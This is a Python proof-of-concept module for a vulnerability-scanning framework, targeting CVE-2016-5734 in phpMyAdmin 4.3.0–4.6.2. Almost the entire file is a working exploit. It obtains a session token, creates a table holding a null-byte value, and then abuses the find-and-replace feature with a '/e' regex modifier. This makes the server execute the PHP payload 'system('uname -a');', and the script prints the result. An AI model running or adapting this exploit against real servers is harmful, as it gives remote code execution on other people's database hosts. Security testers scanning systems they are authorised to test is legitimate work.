# coding: utf-8
import argparse
import sys
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHPMyAdmin_0102'  # 平台漏洞编号
    name = 'PHPMyAdmin authorized user RCE'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
    phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。其中一个更大的优势在于由于phpMyAdmin跟其他PHP程式一样在网页服务器上执行，但是您可以在任何地方使用这些程式产生的HTML页面，也就是于远端管理MySQL数据库，方便的建立、修改、删除数据库及资料表。也可借由phpMyAdmin建立常用的php语法，方便编写网页时所需要的sql语法正确性。
    Working only at PHP 4.3.0-5.4.6 versions, because of regex break with null byte fixed in PHP 5.4.7.
    '''  # 漏洞描述
    ref = 'https://github.com/coffeehb/Some-PoC-oR-ExP/blob/master/PhpMyAdmin/phpmyadmin4.6.2_RCE.py'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2016-5734'  # cve编号
    product = 'PHPMyAdmin'  # 漏洞组件名称
    product_version = '4.3.0 - 4.6.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c7951b1d-c7b8-47a7-a9c0-9cfbf6b65170'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-08'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url_to_pma = self.target
            payload = "system('uname -a');"
            uname = ''
            upass = ''
            db = 'test'
            token = False
            custom_table = False
            table = 'prgpwn'
            size = 32
            s = requests.Session()
            # you can manually add proxy support it's very simple ;)
            # s.proxies = {'http': "127.0.0.1:8080", 'https': "127.0.0.1:8080"}
            s.verify = False
            sql = '''CREATE TABLE `{0}` (
            `first` varchar(10) CHARACTER SET utf8 NOT NULL
            ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
            INSERT INTO `{0}` (`first`) VALUES (UNHEX('302F6500'));
            '''.format(table)
            resp = s.post(url_to_pma + "/?lang=en", dict(
                pma_username=uname,
                pma_password=upass
            ))
            if resp.status_code is 200:
                token_place = resp.text.find("token=") + 6
                token = resp.text[token_place:token_place + 32]
            if token is False:
                # self.output.info("Cannot get valid authorization token.")
                sys.exit(1)

            if custom_table is False:
                data = {
                    "is_js_confirmed": "0",
                    "db": db,
                    "token": token,
                    "pos": "0",
                    "sql_query": sql,
                    "sql_delimiter": ";",
                    "show_query": "0",
                    "fk_checks": "0",
                    "SQL": "Go",
                    "ajax_request": "true",
                    "ajax_page_request": "true",
                }
                resp = s.post(url_to_pma + "/import.php", data,
                              cookies=requests.utils.dict_from_cookiejar(s.cookies))
                if resp.status_code == 200:
                    if "success" in resp.json():
                        if resp.json()["success"] is False:
                            first = resp.json()["error"][resp.json()[
                                "error"].find("<code>")+6:]
                            error = first[:first.find("</code>")]
                            if "already exists" in error:
                                print(error)
                            else:
                                print(("ERROR: " + error))
                                sys.exit(1)
            # build exploit
            exploit = {
                "db": db,
                "table": table,
                "token": token,
                "goto": "sql.php",
                "find": "0/e\0",
                "replaceWith": payload,
                "columnIndex": "0",
                "useRegex": "on",
                "submit": "Go",
                "ajax_request": "true"
            }
            resp = s.post(
                url_to_pma + "/tbl_find_replace.php", exploit, cookies=requests.utils.dict_from_cookiejar(s.cookies)
            )
            if resp.status_code == 200:
                result = resp.json()["message"][resp.json()[
                    "message"].find("</a>")+8:]
                if len(result):
                    print(("result: " + result))
                    sys.exit(0)
                print(
                    "Exploit failed!\n"
                    "Try to manually set exploit parameters like --table, --database and --token.\n"
                    "Remember that servers with PHP version greater than 5.4.6"
                    " is not exploitable, because of warning about null byte in regexp"
                )
                sys.exit(1)

            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
